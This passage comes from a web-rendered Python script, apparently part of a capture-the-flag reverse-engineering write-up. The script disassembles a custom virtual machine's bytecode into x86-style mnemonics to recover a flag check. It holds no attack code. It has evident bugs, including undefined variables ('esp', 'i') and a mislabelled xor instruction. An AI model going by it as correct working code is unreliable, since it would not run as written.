class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">0xA1</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x02</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDD</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x03</span>,</span><br><span class="line">        <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x04</span>, <span class="number">0xB2</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x06</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4F</span>, <span class="number">0x01</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0A</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0x0B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x0C</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>,</span><br><span class="line">        <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0E</span>, <span class="number">0xB3</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x11</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x13</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x14</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0x15</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x17</span>,</span><br><span class="line">        <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x18</span>, <span class="number">0xB1</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x19</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0xC2</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1A</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1C</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0x1F</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x20</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0x02</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0xF1</span>, <span class="number">0x98</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>,</span><br><span class="line">        <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0xB9</span>, <span class="number">0xE4</span>,</span><br><span class="line">        <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0xC1</span>, <span class="number">0x24</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x25</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0xC1</span>, <span class="number">0x28</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2A</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2B</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>,</span><br><span class="line">        <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>,</span><br><span class="line">        <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC8</span>, <span class="number">0x99</span></span><br><span class="line">        ]</span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line">eax = <span class="number">0</span></span><br><span class="line">ebx = <span class="number">0</span></span><br><span class="line">ecx = <span class="number">0</span></span><br><span class="line">edx = <span class="number">0</span></span><br><span class="line">esi = <span class="number">0</span></span><br><span class="line">r9 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">buf = [<span class="number">0x7b</span>, <span class="number">0x2f</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_reg</span>(<span class="params">idx</span>):</span><br><span class="line">    rg = &#123;<span class="number">6</span>: <span class="string">&#x27;esp&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;eax&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;ebx&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;ecx&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;edx&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;esi&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;r9&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> rg[idx]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bhex</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(code[x])[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">113</span>):</span><br><span class="line"></span><br><span class="line">        esp -= <span class="number">4</span></span><br><span class="line">        esp = code[ip+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;push&quot;</span> + <span class="built_in">hex</span>(code[ip+<span class="number">1</span>]))</span><br><span class="line">        ip += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">65</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;add eax,ebx&quot;</span>)</span><br><span class="line">        eax += ebx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">66</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sub eax,edx&quot;</span>)</span><br><span class="line">        eax -= edx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">67</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mul eax,ecx&quot;</span>)</span><br><span class="line">        eax *= ecx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">55</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov eax,esi&quot;</span>)</span><br><span class="line">        eax = esi</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">56</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov eax,esi&quot;</span>)</span><br><span class="line">        eax ^= edx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">57</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;xor eax,esi&quot;</span>)</span><br><span class="line">        eax ^= esi</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">53</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov esi,eax&quot;</span>)</span><br><span class="line">        esi = eax</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xF7</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;add r9,eax&quot;</span>)</span><br><span class="line"></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        r9 += eax</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">68</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;div eax,esi&quot;</span>)</span><br><span class="line">        eax //= esi</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0x80</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;mov <span class="subst">&#123;get_reg(code[ip+<span class="number">1</span>])&#125;</span>,<span class="subst">&#123;<span class="built_in">hex</span>(code[ip+<span class="number">5</span>])+bhex(ip+<span class="number">4</span>)+bhex(ip+<span class="number">3</span>)+bhex(ip+<span class="number">2</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        ebx = code[ip+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        ip += <span class="number">6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">119</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;xor eax,r9&quot;</span>)</span><br><span class="line">        eax ^= r9</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">83</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;putchar [ecx]&quot;</span>)</span><br><span class="line">        <span class="comment"># putchar(*ecx)</span></span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">34</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;shr eax,ebx&quot;</span>)</span><br><span class="line">        eax &gt;&gt;= ebx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">35</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;shl eax,ebx&quot;</span>,ebx)</span><br><span class="line">        eax &lt;&lt;= ebx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0x99</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;break&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">118</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pop ecx&quot;</span>)</span><br><span class="line">        <span class="comment"># ecx = *esp</span></span><br><span class="line">        <span class="comment"># *esp = 0</span></span><br><span class="line">        <span class="comment"># esp += 4</span></span><br><span class="line">        ip += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">84</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read [ecx]&quot;</span>)</span><br><span class="line">        v2 = ecx</span><br><span class="line">        <span class="comment"># *v2 = getchar():</span></span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">48</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;or eax,ebx&quot;</span>)</span><br><span class="line">        eax |= ebx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">49</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;and eax,ebx&quot;</span>)</span><br><span class="line">        eax &amp;= ebx</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">50</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov ecx,&quot;</span> + <span class="built_in">hex</span>(code[ip+<span class="number">1</span>]))</span><br><span class="line">        ecx = code[ip+<span class="number">1</span>]</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">9</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov eax,&quot;</span> + <span class="built_in">hex</span>(<span class="number">1877735783</span>))</span><br><span class="line">        eax = <span class="number">1877735783</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">16</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov r9,eax&quot;</span>)</span><br><span class="line">        r9 = eax</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">51</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov edx,eax&quot;</span>)</span><br><span class="line">        edx = eax</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">52</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov ebx&quot;</span> + <span class="built_in">hex</span>(code[ip+<span class="number">1</span>]))</span><br><span class="line">        ebx = code[ip+<span class="number">1</span>]</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xFE</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov eax,r9&quot;</span>)</span><br><span class="line">        eax = r9</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">17</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;print [eax]&quot;</span>)</span><br><span class="line">        <span class="comment">#printf(&quot;%x\n&quot;, eax)</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xA0</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if eax!= &quot;</span> + <span class="built_in">hex</span>(<span class="number">1877735783</span>) + <span class="string">&quot;\n goto wrong\n&quot;</span>)</span><br><span class="line">        <span class="comment"># if (eax != 1877735783):</span></span><br><span class="line">        <span class="comment">#     exit(0)</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xA1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read( %44s)&quot;</span>)</span><br><span class="line">        <span class="comment"># read(0, s, 0x2Cu):</span></span><br><span class="line">        <span class="comment"># if (len(s) != 44):</span></span><br><span class="line">        <span class="comment">#     exit(0):</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xB1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;r9 = buf[0]&quot;</span>)</span><br><span class="line">        r9 = buf[<span class="number">0</span>]</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xB2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;r9 = buf[1]&quot;</span>)</span><br><span class="line">        r9 = buf[<span class="number">1</span>]</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xA4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;buf[code[ip + 1]] = eax&quot;</span>)</span><br><span class="line">        buf[code[ip + <span class="number">1</span>]] = eax</span><br><span class="line">        ip += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span class="number">0xB3</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;r9 = buf[2]&quot;</span>)</span><br><span class="line">        r9 = buf[<span class="number">2</span>]</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code[ip] == <span 